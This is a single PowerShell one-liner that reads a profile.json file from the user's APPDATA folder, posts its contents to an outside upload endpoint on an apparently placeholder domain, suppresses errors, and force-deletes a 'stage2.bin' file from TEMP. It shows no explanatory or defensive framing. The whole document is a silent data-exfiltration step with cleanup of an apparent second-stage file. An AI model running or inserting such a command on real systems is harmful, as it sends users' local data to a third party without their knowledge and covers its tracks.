
$BodyText = Get-Content -Path "$env:APPDATA\profile.json" -Raw -ErrorAction SilentlyContinue; Invoke-RestMethod -Uri "https://adatum.com/upload" -Method Post -Body $BodyText -ContentType "application/json" -ErrorAction SilentlyContinue; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
